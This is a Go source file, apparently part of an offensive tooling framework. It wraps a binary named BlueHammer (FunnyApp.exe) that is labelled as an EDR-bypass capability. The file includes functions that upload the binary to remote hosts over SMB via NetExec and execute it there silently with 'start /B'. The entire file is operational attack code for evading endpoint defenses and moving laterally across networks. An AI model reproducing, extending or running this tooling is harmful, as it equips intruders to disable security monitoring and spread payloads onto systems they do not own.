package tools

import (
	"context"
	"adpack/utils"
	"fmt"
)

type blueHammerTool struct{}

var BlueHammer = blueHammerTool{}

func (blueHammerTool) Name() string    { return "BlueHammer" }
func (blueHammerTool) Available() bool {
	return utils.ToolAvailable("FunnyApp.exe") || utils.ToolAvailable("BlueHammer.exe") || utils.ToolAvailable("bluehammer")
}

func (blueHammerTool) Validate() error {
	if !BlueHammer.Available() {
		return &ToolError{Tool: "BlueHammer", Op: "validate", Err: fmt.Errorf("FunnyApp.exe not found")}
	}
	return nil
}

func (blueHammerTool) Capabilities() []Capability {
	return []Capability{CapEDRBypass}
}

func (b blueHammerTool) RunStream(ctx context.Context, req ExecutionRequest) (<-chan ExecutionEvent, error) {
	ch := make(chan ExecutionEvent, 1)
	go func() {
		defer close(ch)
		result, err := b.Run(ctx, req)
		if err != nil {
			ch <- ExecutionEvent{Type: "error", Status: StatusFailed, Error: err}
			return
		}
		ch <- ExecutionEvent{Type: "complete", Status: StatusSuccess, Result: result}
	}()
	return ch, nil
}

type BlueHammerConfig struct {
	Binary    string
	SessionID int
}

func DefaultBlueHammerConfig() BlueHammerConfig {
	return BlueHammerConfig{
		Binary: "FunnyApp.exe",
	}
}

func (b blueHammerTool) Run(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
	cfg := DefaultBlueHammerConfig()
	if len(req.Args) > 0 {
		fmt.Sscanf(req.Args[0], "%d", &cfg.SessionID)
	}
	args := []string{}
	if cfg.SessionID > 0 {
		args = append(args, fmt.Sprintf("%d", cfg.SessionID))
	}
	r := utils.RunCommandCtx(ctx, cfg.Binary, args)
	if !r.Success {
		return cmdResultToExecResult(r), &ToolError{Tool: "BlueHammer", Op: "run", ExitCode: r.ExitCode, Err: fmt.Errorf("%s", r.Stderr)}
	}
	return cmdResultToExecResult(r), nil
}

func (b blueHammerTool) DeployViaSMB(ctx context.Context, target NetExecTarget, localPath, remoteDir string) (*ExecutionResult, error) {
	if !b.Available() {
		return nil, &ToolError{Tool: "BlueHammer", Op: "deploy", Err: fmt.Errorf("FunnyApp.exe not found locally")}
	}
	cr, err := NetExec.PutFile(ctx, target, localPath, remoteDir)
	if err != nil {
		return cmdResultToExecResult(cr), &ToolError{Tool: "BlueHammer", Op: "deploy", Err: err, ExitCode: cr.ExitCode}
	}
	return cmdResultToExecResult(cr), nil
}

func (b blueHammerTool) ExecRemote(ctx context.Context, target NetExecTarget, remotePath string) (*ExecutionResult, error) {
	cr, err := NetExec.Run(ctx, target, "-x", []string{fmt.Sprintf(`start /B %s`, remotePath)})
	if err != nil {
		return cmdResultToExecResult(cr), &ToolError{Tool: "BlueHammer", Op: "exec_remote", Err: err, ExitCode: cr.ExitCode}
	}
	return cmdResultToExecResult(cr), nil
}
